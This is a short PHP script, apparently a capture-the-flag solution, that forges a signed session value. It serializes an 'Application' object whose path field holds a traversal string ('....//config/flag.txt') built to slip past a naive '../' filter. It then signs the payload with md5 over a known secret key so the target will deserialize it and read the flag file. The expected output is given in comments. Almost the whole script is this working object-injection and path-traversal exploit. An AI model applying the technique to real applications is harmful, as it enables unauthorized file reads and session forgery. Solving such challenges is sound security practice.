<?php
  /**
   * Could be run on https://phpfiddle.org/ or https://eval.in/
   */
  $key = 'EzblrbNS';

  class Application {
    var $path = "....//config/flag.txt";
  }
  $instance = new Application();
  $payload = serialize($instance);
  // echo $payload;
  // O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}

  $session = $payload.md5($key.$payload);
  echo $session;
  // O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525

?>
